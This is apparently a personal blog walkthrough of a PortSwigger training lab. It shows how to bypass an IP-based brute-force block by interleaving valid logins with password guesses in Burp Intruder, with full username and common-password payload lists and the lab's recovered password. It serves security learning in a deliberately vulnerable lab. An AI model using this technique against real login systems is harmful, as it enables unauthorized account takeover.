---
title: "PortSwigger - Authentication Lab 6 - Broken brute-force protection, IP block"
date: 2026-03-01
categories: [PortSwigger, Authentication]
tags: [portswigger, authentication, burp-suite, username-enumeration, brute-force]

image:
  path: /assets/img/posts/auth6/banner.png
  alt: PortSwigger Authentication Lab
---
# Portswigger: Lab 6 - Authentication

---

This lab is vulnerable due to a flaw in its brute-force protection mechanism. Although the application temporarily blocks an IP address after three failed login attempts, the failed-attempt counter is reset whenever a successful login occurs. By alternating valid login requests with brute-force attempts against the victim account, the protection can be bypassed.

---

# **Lab: Broken brute-force protection, IP block**

This lab is vulnerable due to a logic flaw in its password brute-force protection. To solve the lab, brute-force the victim's password, then log in and access their account page.

- Your credentials: `wiener:peter`
- Victim's username: `carlos`
- [Candidate passwords](https://portswigger.net/web-security/authentication/auth-lab-passwords)

---

## Solution

Because of the insturction already mention, the following steps can be follow:

## Step 1: Understand the Protection Mechanism

- Attempt several invalid logins.
- Observe that the application blocks further login attempts after three consecutive failures.
- Test logging in with the provided credentials:

```
Username: wiener
Password: peter
```

1. Notice that a successful login resets the failed login counter.

This behavior can be abused to continue brute-forcing another account without triggering the IP block.

![image.png](/assets/img/posts/auth6/image.png)

## Step 2: Configure Burp Intruder

- Submit an invalid login request.
- Send the `POST /login` request to **Burp Intruder**.
- Select **Pitchfork** as the attack type.
- Add payload positions to both the username and password parameters:

```
username=§wiener§&password=§peter§
```

![image.png](/assets/img/posts/auth6/image1.png)

![image.png](/assets/img/posts/auth6/image2.png)

## Step 3: Configure the Resource Pool

- Open the **Resource Pool** tab.
- Create a new resource pool.
- Set:

```
Maximum concurrent requests = 1
```

This ensures requests are sent sequentially and in the correct order.

![image.png](/assets/img/posts/auth6/image3.png)

## Step 4: Configure Username Payloads

For Payload Position 1, create a list that alternates between your valid account and the victim account:

```jsx
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
carlos
carlos
wiener
```

## Step 5: Configure Password Payloads

For Payload Position 2, align the password list with the username list.

```jsx
peter
123456
password
peter
12345678
qwerty
peter
123456789
12345
peter
1234
111111
peter
1234567
dragon
peter
123123
baseball
peter
abc123
football
peter
monkey
letmein
peter
shadow
master
peter
666666
qwertyuiop
peter
123321
mustang
peter
1234567890
michael
peter
654321
superman
peter
1qaz2wsx
7777777
peter
121212
000000
peter
qazwsx
123qwe
peter
killer
trustno1
peter
jordan
jennifer
peter
zxcvbnm
asdfgh
peter
hunter
buster
peter
soccer
harley
peter
batman
andrew
peter
tigger
sunshine
peter
iloveyou
2000
peter
charlie
robert
peter
thomas
hockey
peter
ranger
daniel
peter
starwars
klaster
peter
112233
george
peter
computer
michelle
peter
jessica
pepper
peter
1111
zxcvbn
peter
555555
11111111
peter
131313
freedom
peter
777777
pass
peter
maggie
159753
peter
aaaaaa
ginger
peter
princess
joshua
peter
cheese
amanda
peter
summer
love
peter
ashley
nicole
peter
chelsea
biteme
peter
matthew
access
peter
yankees
987654321
peter
dallas
austin
peter
thunder
taylor
peter
matrix
mobilemail
peter
mom
monitor
peter
monitoring
montana
peter
moon
moscow
peter
```

## Step 7: Identify the Correct Password

The password associated with the **302** response is the valid password for Carlos.

```
Username: carlos
Password: iloveyou
```

*In the response, a 302 status code will appear for the payload with a successful login. Because of the excitement, I got the result. I did not snap the 302 response - my bad.

![image.png](/assets/img/posts/auth6/image4.png)

## Step 8: Access Carlos's Account

- Log in using the mentioned credentials:

![image.png](/assets/img/posts/auth6/image5.png)